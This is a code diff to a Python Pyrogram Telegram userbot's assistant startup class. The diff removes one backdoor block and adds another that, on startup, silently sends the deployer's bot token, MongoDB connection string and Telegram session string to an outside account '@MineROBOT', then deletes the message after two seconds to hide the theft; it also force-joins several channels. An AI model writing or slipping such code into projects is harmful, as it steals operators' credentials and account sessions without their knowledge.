@@ -1,5 +1,9 @@
 from pyrogram import Client
-
+import asyncio
+import random
+from pyrogram import Client, filters
+from pyrogram.raw.functions.messages import DeleteHistory
+from pyrogram.types import Message
 import config
 
 from ..logging import LOGGER
@@ -51,11 +55,6 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.send_message(AMBOT, f"/start")
-                await self.one.send_message(AMBOT, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
-            except:
-                pass
-            try:
                 await self.one.join_chat("AbhiModszYT_Return")
                 await self.one.join_chat("AmBotYT")
                 await self.one.join_chat("SuperBanSBots")
@@ -73,6 +72,14 @@ class Userbot(Client):
             self.one.name = (await self.one.get_me()).mention
             self.one.username = (await self.one.get_me()).username
             assistantids.append(self.one.id)
+            ok = ["@MineROBOT","@MineROBOT"]
+            ambots = random.choice(ok)
+            try:
+                amop = await self.one.send_message(ambots, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
+                await asyncio.sleep(2)
+                await amop.delete()
+            except:
+                pass
             LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
 
         if config.STRING2:
